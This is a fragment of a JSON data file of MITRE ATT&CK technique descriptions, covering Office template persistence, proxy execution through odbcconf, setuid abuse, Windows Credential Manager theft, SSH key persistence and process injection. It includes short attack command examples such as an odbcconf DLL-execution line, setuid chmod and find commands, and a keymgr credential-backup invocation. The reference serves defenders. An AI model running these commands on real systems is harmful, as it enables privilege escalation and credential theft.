    "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros."
  ],
  "office application startup: outlook home page": [
    "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)\n"
  ],
  "exploitation for defense evasion": [
    "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection."
  ],
  "system binary proxy execution: odbcconf": [
    "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n"
  ],
  "file and directory permissions modification: linux and mac file and directory permissions modification": [
    "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) "
  ],
  "use alternate authentication material: web session cookie": [
    "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)"
  ],
  "domain policy modification": [
    "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\n\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators."
  ],
  "network denial of service": [
    "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499)."
  ],
  "debugger evasion": [
    "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)"
  ],
  "credentials from password stores: windows credential manager": [
    "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)"
  ],
  "stage capabilities: drive-by target": [
    "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)."
  ],
  "abuse elevation control mechanism: setuid and setgid": [
    "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgit bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)"
  ],
  "hijack execution flow": [
    "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."
  ],
  "obtain capabilities": [
    "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)"
  ],
  "phishing for information: spearphishing service": [
    "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures."
  ],
  "unsecured credentials: bash history": [
    "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)"
  ],
  "boot or logon autostart execution: print processors": [
    "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges."
  ],
  "abuse elevation control mechanism: elevated execution with prompt": [
    "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)"
  ],
  "supply chain compromise": [
    "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)"
  ],
  "exfiltration over other network medium": [
    "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network."
  ],
  "boot or logon initialization scripts: login hook": [
    "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) "
  ],
  "process injection: thread local storage": [
    "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "process injection: proc memory": [
    "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "process injection: extra window memory injection": [
    "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "account manipulation: ssh authorized keys": [
    "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm)\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. "
  ],
  "trusted developer utilities proxy execution": [
    "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions."
  ],
  "access token manipulation: make and impersonate token": [
    "Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread."
  ],
  "traffic signaling": [
    "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)"
  ],
  "data from information repositories: confluence": [
    "\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
  ],
  "boot or logon autostart execution: kernel modules and extensions": [
